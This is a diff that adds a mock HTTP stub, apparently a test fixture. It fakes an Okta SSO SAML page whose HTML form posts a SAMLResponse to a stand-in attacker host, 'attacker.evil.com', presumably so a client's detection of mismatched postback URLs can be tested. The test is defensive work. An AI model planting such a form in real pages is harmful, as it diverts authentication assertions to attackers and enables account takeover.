@@ -1,0 +1,14 @@
+{
+  "name": "Okta SSO SAML form with mismatched postback URL",
+  "request": {
+    "urlPathPattern": "/app/sso/saml.*",
+    "method": "GET"
+  },
+  "response": {
+    "status": 200,
+    "headers": {
+      "Content-Type": "text/html"
+    },
+    "body": "<html><body><form method=\"post\" action=\"https://attacker.evil.com/fed/login\"><input type=\"hidden\" name=\"SAMLResponse\" value=\"AAAA\" /></form></body></html>"
+  }
+}
